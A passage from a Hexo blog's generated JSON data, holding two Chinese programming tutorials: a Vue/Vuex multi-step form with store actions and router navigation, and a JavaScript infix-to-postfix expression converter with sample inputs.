class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        formItemLayout: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          labelCol: &#123; span: 4 &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">          wrapperCol: &#123; span: 14 &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    computed: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      step() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$store.state.form.step;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleSubmit() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> &#123; form, $store, step &#125; = <span class=\"keyword\">this</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        form.validateFields(<span class=\"function\">(<span class=\"params\">err, values</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            $store.dispatch(<span class=\"string\">\"form/submitStepForm\"</span>, &#123; ...step, ...values &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">      handlePre() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$router.push(<span class=\"string\">\"/form/step-form/info\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>假如该分步表单有三步，对应组件为 <code>Step1.vue</code>，<code>Step2.vue</code>，<code>Step3.vue</code>，第一步需要填写收款账号，第二步需要填写用户密码，可以回到上一步修改收款账号，可以直接填写密码提交后端接口进行数据可视化，成功后跳到第三步显示成功信息。主要知识点有 vuex 和编程式的导航。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a><br><img src=\"/vue-in-action-stepForm/step-form.gif\" alt=\"效果图\"></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"创建-store，vuex-相关配置\"><a href=\"#创建-store，vuex-相关配置\" class=\"headerlink\" title=\"创建 store，vuex 相关配置\"></a>创建 store，vuex 相关配置</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/store/modules/form.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> router <span class=\"keyword\">from</span> <span class=\"string\">\"../../router\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> request <span class=\"keyword\">from</span> <span class=\"string\">\"../../utils/request\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> state = &#123;</span><br><span class=\"line\">  step: &#123;</span><br><span class=\"line\">    payAccount: <span class=\"string\">\"123456\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> actions = &#123;</span><br><span class=\"line\">  <span class=\"keyword\">async</span> submitStepForm(&#123; commit &#125;, payload) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(payload);</span><br><span class=\"line\">    <span class=\"keyword\">await</span> request(&#123;</span><br><span class=\"line\">      url: <span class=\"string\">\"/api/form\"</span>,</span><br><span class=\"line\">      method: <span class=\"string\">\"POST\"</span>,</span><br><span class=\"line\">      data: payload</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    commit(<span class=\"string\">\"saveStepFormData\"</span>, payload);</span><br><span class=\"line\">    router.push(<span class=\"string\">\"/form/step-form/result\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> mutations = &#123;</span><br><span class=\"line\">  saveStepFormData(state, payload) &#123;</span><br><span class=\"line\">    state.step = &#123;</span><br><span class=\"line\">      ...state.step,</span><br><span class=\"line\">      ...payload</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  namespaced: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  state,</span><br><span class=\"line\">  actions,</span><br><span class=\"line\">  mutations</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/store/index.js</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> Vue <span class=\"keyword\">from</span> <span class=\"string\">\"vue\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> Vuex <span class=\"keyword\">from</span> <span class=\"string\">\"vuex\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> form <span class=\"keyword\">from</span> <span class=\"string\">\"./modules/form\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">Vue.use(Vuex);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"keyword\">new</span> Vuex.Store(&#123;</span><br><span class=\"line\">  state: &#123;&#125;,</span><br><span class=\"line\">  modules: &#123;</span><br><span class=\"line\">    form</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>调用 vuex 的 <code>mutations</code> 的 <code>saveStepFormData</code> 方法把数据保存到 <code>state</code>，然后路由跳转到第二步页面。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- Step1.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        formItemLayout: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          labelCol: &#123; span: 4 &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">          wrapperCol: &#123; span: 14 &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    computed: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      step() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$store.state.form.step;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleSubmit() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> &#123; form, $router, $store &#125; = <span class=\"keyword\">this</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        form.validateFields(<span class=\"function\">(<span class=\"params\">err, values</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            $store.commit(<span class=\"string\">\"form/saveStepFormData\"</span>, values);</span></span><br><span class=\"line\"><span class=\"javascript\">            $router.push(<span class=\"string\">\"/form/step-form/confirm\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>调用 <code>actions</code> 的 <code>submitStepForm</code> 方法，异步请求后端接口进行数据持久化，然后更新 <code>state</code>，最后路由跳转到成功页。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        formItemLayout: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          labelCol: &#123; span: 4 &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">          wrapperCol: &#123; span: 14 &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    computed: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      step() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$store.state.form.step;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleSubmit() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> &#123; form, $store, step &#125; = <span class=\"keyword\">this</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        form.validateFields(<span class=\"function\">(<span class=\"params\">err, values</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            $store.dispatch(<span class=\"string\">\"form/submitStepForm\"</span>, &#123; ...step, ...values &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">      handlePre() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$router.push(<span class=\"string\">\"/form/step-form/info\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"数据结构与算法@中缀式转后缀式","date":"2019-05-17T08:20:40.000Z","updated":"2019-05-17T08:20:40.000Z","_content":"\n# 概述\n\n算术表达式中缀式转后缀式，例如\"A+(B-C/D)_E\" => \"ABCD/-E_+\" ; \"A+B-C/D\" => \"AB+CD/-\"。\n算法思路：https://blog.csdn.net/allinone99/article/details/81297098\n\n<!-- more -->\n\n# 详述\n\n```js\nfunction infix2suffix(infixExp) {\n  // 判断操作符方法\n  let isOperator = function(val) {\n    return [\"+\", \"-\", \"*\", \"/\", \"^\", \"(\", \")\"].indexOf(val) !== -1;\n  };\n  // 计算优先级方法\n  let getPriority = function(val) {\n    let result = 0;\n    switch (val) {\n      case \"^\":\n        result = 3;\n        break;\n      case \"*\":\n      case \"/\":\n        result = 2;\n        break;\n      case \"+\":\n      case \"-\":\n        result = 1;\n        break;\n      default:\n        break;\n    }\n    return result;\n  };\n\n  // 操作符存放栈\n  let operatorStack = new Stack();\n  let suffixExp = \"\";\n  for (let i = 0; i < infixExp.length; i++) {\n    const char = infixExp[i];\n\n    if (isOperator(char)) {\n      if (\n        char === \"(\" ||\n        operatorStack.length === 0 ||\n        getPriority(char) > getPriority(operatorStack.peek())\n      ) {\n        operatorStack.push(char);\n      } else if (char === \")\") {\n        while (!operatorStack.isEmpty()) {\n          if (operatorStack.peek() === \"(\") {\n            operatorStack.pop();\n            break;\n          } else {\n            suffixExp += operatorStack.pop();\n          }\n        }\n      } else {\n        suffixExp += operatorStack.pop();\n        operatorStack.push(char);\n      }\n    } else {\n      suffixExp += char;\n    }\n  }\n  // 读取完成，则将栈中剩余的运算符依次弹出到后缀表达式\n  while (!operatorStack.isEmpty()) {\n    suffixExp += operatorStack.pop();\n  }\n  return suffixExp;\n}\n\nlet exp1 = \"A+(B-C/D)*E\";\nlet exp2 = \"a+b*c+(d*e+f)*g\";\nlet exp3 = \"A+B-C/D\";\nconsole.log(exp1 + \" => \" + infix2suffix(exp1));\nconsole.log(exp2 + \" => \" + infix2suffix(exp2));\nconsole.log(exp3 + \" => \" + infix2suffix(exp3));\n```\n\n# 参考\n","source":"_posts/2019/05/数据结构与算法-中缀式转后缀式.md","raw":"---\ntitle: 数据结构与算法@中缀式转后缀式\npermalink: 数据结构与算法@中缀式转后缀式\ntags:\n  - JavaScript\ncategories:\n  - 基础\n  - 数据结构与算法\ndate: 2019-05-17 16:20:40\nupdated: 2019-05-17 16:20:40\n---\n\n# 概述\n\n算术表达式中缀式转后缀式，例如\"A+(B-C/D)_E\" => \"ABCD/-E_+\" ; \"A+B-C/D\" => \"AB+CD/-\"。\n算法思路：https://blog.csdn.net/allinone99/article/details/81297098\n\n<!-- more -->\n\n# 详述\n\n```js\nfunction infix2suffix(infixExp) {\n  // 判断操作符方法\n  let isOperator = function(val) {\n    return [\"+\", \"-\", \"*\", \"/\", \"^\", \"(\", \")\"].indexOf(val) !== -1;\n  };\n  // 计算优先级方法\n  let getPriority = function(val) {\n    let result = 0;\n    switch (val) {\n      case \"^\":\n        result = 3;\n        break;\n      case \"*\":\n      case \"/\":\n        result = 2;\n        break;\n      case \"+\":\n      case \"-\":\n        result = 1;\n        break;\n      default:\n        break;\n    }\n    return result;\n  };\n\n  // 操作符存放栈\n  let operatorStack = new Stack();\n  let suffixExp = \"\";\n  for (let i = 0; i < infixExp.length; i++) {\n    const char = infixExp[i];\n\n    if (isOperator(char)) {\n      if (\n        char === \"(\" ||\n        operatorStack.length === 0 ||\n        getPriority(char) > getPriority(operatorStack.peek())\n      ) {\n        operatorStack.push(char);\n      } else if (char === \")\") {\n        while (!operatorStack.isEmpty()) {\n          if (operatorStack.peek() === \"(\") {\n            operatorStack.pop();\n            break;\n          } else {\n            suffixExp += operatorStack.pop();\n          }\n        }\n      } else {\n        suffixExp += operatorStack.pop();\n        operatorStack.push(char);\n      }\n    } else {\n      suffixExp += char;\n    }\n  }\n  // 读取完成，则将栈中剩余的运算符依次弹出到后缀表达式\n  while (!operatorStack.isEmpty()) {\n    suffixExp += operatorStack.pop();\n  }\n  return suffixExp;\n}\n\nlet exp1 = \"A+(B-C/D)*E\";\nlet exp2 = \"a+b*c+(d*e+f)*g\";\nlet exp3 = \"A+B-C/D\";\nconsole.log(exp1 + \" => \" + infix2suffix(exp1));\nconsole.log(exp2 + \" => \" + infix2suffix(exp2));\nconsole.log(exp3 + \" => \" + infix2suffix(exp3));\n```\n\n# 参考\n","slug":"数据结构与算法@中缀式转后缀式","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xw007bwovvjszxhjj2","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>算术表达式中缀式转后缀式，例如”A+(B-C/D)<em>E” =&gt; “ABCD/-E</em>+” ; “A+B-C/D” =&gt; “AB+CD/-“。<br>算法思路：<a href=\"https://blog.csdn.net/allinone99/article/details/81297098\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/allinone99/article/details/81297098</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">infix2suffix</span>(<span class=\"params\">infixExp</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 判断操作符方法</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> isOperator = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"string\">\"+\"</span>, <span class=\"string\">\"-\"</span>, <span class=\"string\">\"*\"</span>, <span class=\"string\">\"/\"</span>, <span class=\"string\">\"^\"</span>, <span class=\"string\">\"(\"</span>, <span class=\"string\">\")\"</span>].indexOf(val) !== <span class=\"number\">-1</span>;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">// 计算优先级方法</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> getPriority = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (val) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"^\"</span>:</span><br><span class=\"line\">        result = <span class=\"number\">3</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"*\"</span>:</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"/\"</span>:</span><br><span class=\"line\">        result = <span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"+\"</span>:</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">\"-\"</span>:</span><br><span class=\"line\">        result = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 操作符存放栈</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> operatorStack = <span class=\"keyword\">new</span> Stack();</span><br><span class=\"line\">  <span class=\"keyword\">let</span> suffixExp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; infixExp.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> char = infixExp[i];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isOperator(char)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (</span><br><span class=\"line\">        char === <span class=\"string\">\"(\"</span> ||</span><br><span class=\"line\">        operatorStack.length === <span class=\"number\">0</span> ||</span><br><span class=\"line\">        getPriority(char) &gt; getPriority(operatorStack.peek())</span><br><span class=\"line\">      ) &#123;</span><br><span class=\"line\">        operatorStack.push(char);</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (char === <span class=\"string\">\")\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!operatorStack.isEmpty()) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (operatorStack.peek() === <span class=\"string\">\"(\"</span>) &#123;</span><br><span class=\"line\">            operatorStack.pop();</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            suffixExp += operatorStack.pop();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        suffixExp += operatorStack.pop();</span><br><span class=\"line\">        operatorStack.push(char);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      suffixExp += char;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 读取完成，则将栈中剩余的运算符依次弹出到后缀表达式</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (!operatorStack.isEmpty()) &#123;</span><br><span class=\"line\">    suffixExp += operatorStack.pop();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> suffixExp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> exp1 = <span class=\"string\">\"A+(B-C/D)*E\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> exp2 = <span class=\"string\">\"a+b*c+(d*e+f)*g\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">let</span> exp3 = <span class=\"string\">\"A+B-C/D\"</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(exp1 + <span class=\"string\">\" =&gt; \"</span> + infix2suffix(exp1));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(exp2 + <span class=\"string\">\" =&gt; \"</span> + infix2suffix(exp2));</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(exp3 + <span class=\"string\">\" =&gt; \"</span> + infix2suffix(exp3));</span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1>","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" 